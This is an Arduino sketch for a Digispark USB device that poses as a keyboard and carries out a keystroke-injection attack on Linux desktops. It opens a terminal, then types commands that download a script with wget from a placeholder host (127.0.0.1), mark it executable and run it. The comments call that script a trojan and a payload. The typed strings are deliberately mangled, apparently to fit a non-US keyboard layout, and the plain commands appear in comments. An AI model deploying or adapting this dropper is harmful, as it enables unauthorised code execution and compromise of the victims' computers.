#include "DigiKeyboard.h"

// DELAY 5000 for demonstration and debugging
// DELAY 500 for fast execution
#define DELAY 5000


void setup()
{
  // LED on Model A
	pinMode(1, OUTPUT); 
  digitalWrite(1, HIGH);
  
  DigiKeyboard.delay(500);
  digitalWrite(1, LOW);
  DigiKeyboard.update();
  //DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(1000);

  // Begin the attack

  // on some linux desktops ctrl+alt+t does not open a terminal, alt+F2 (Application Launcher) can be tried instead
  // Start Application Launcher
  //DigiKeyboard.sendKeyStroke(MOD_ALT_LEFT, KEY_F2);
  // Open Terminal
  // DigiKeyboard.println("x-terminal-emulator");
  //DigiKeyboard.println("x/terminal/emulator");
  //DigiKeyboard.sendKeyStroke(KEY_ENTER);

  // Open Terminal
  DigiKeyboard.sendKeyStroke(KEY_T, MOD_CONTROL_LEFT | MOD_ALT_LEFT); 
  DigiKeyboard.delay(DELAY);
  
  // DigiKeyboard.println("wget -N -q http://127.0.0.1/payload.sh"); // download trojan
  DigiKeyboard.println("wget /N /q http>&&127.0.0.1&pazload.sh");
  //DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(DELAY);
  // DigiKeyboard.println("chmod +x shell.elf"); // set execute permissions
  DigiKeyboard.println("chmod ]x pazload.sh");
  DigiKeyboard.delay(DELAY);
  // execute payload
  // DigiKeyboard.println("./payload.sh");
  DigiKeyboard.println(".&pazload.sh");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(DELAY);
  
  // Close Terminal
  // For demonstration purposes leave the terminal open
  //DigiKeyboard.println("exit");
  //DigiKeyboard.sendKeyStroke(KEY_ENTER);
  //DigiKeyboard.delay(DELAY);

  // Turn on led when program finishes
  digitalWrite(1, HIGH);
}

void loop(){}
